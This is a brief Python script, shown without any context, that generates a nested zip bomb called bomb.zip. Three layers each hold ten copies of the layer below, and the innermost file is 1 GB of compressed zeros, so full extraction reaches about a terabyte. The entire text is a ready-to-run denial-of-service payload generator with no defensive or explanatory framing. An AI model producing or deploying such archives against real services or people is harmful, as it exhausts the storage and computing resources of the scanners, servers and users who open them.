import zipfile, os

def create_layer(depth, path):
    if depth == 0:
        with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr("final.bin", b"\x00" * (1024**3))  # 1GB of zeros
    else:
        inner = f"layer_{depth-1}.zip"
        create_layer(depth - 1, inner)
        with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
            for i in range(10):
                z.write(inner, f"{i}/{inner}")
        os.remove(inner)

create_layer(3, "bomb.zip")
